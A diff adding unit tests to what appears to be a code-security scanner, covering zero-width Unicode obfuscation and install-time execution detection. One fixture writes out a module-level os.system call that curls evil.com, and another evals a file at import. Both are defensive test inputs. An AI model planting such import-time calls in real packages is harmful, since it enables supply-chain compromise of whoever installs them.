@@ -645,6 +645,40 @@ class TestEvalExec:
         fixed, count = fix_eval_exec(code)
         assert count == 0
 
+class TestUnicodeObfuscation:
+    def test_detects_zero_width_char(self):
+        from shield.rules.custom_rules import fix_unicode_obfuscation
+        code = "x = 'hello\u200bworld'"
+        fixed, count = fix_unicode_obfuscation(code)
+        assert count > 0
+        assert "SHIELD WARNING" in fixed
+
+    def test_no_false_positive_clean_string(self):
+        from shield.rules.custom_rules import fix_unicode_obfuscation
+        code = "x = 'hello world'"
+        fixed, count = fix_unicode_obfuscation(code)
+        assert count == 0
+
+
+class TestInstallExec:
+    def test_detects_module_level_system_call(self):
+        from shield.rules.custom_rules import fix_install_exec
+        code = "import os\nos.system('curl http://evil.com')"
+        fixed, count = fix_install_exec(code)
+        assert count > 0
+        assert "SHIELD WARNING" in fixed
+
+    def test_no_false_positive_inside_function(self):
+        from shield.rules.custom_rules import fix_install_exec
+        code = "import os\ndef run():\n    os.system('ls')"
+        fixed, count = fix_install_exec(code)
+        assert count == 0
+
+    def test_detects_module_level_eval(self):
+        from shield.rules.custom_rules import fix_install_exec
+        code = "eval(open('config.py').read())"
+        fixed, count = fix_install_exec(code)
+        assert count > 0
 # ══════════════════════════════════════════════════════════════════════════════
 # REMEDIATION MAP — structural tests
 # ══════════════════════════════════════════════════════════════════════════════
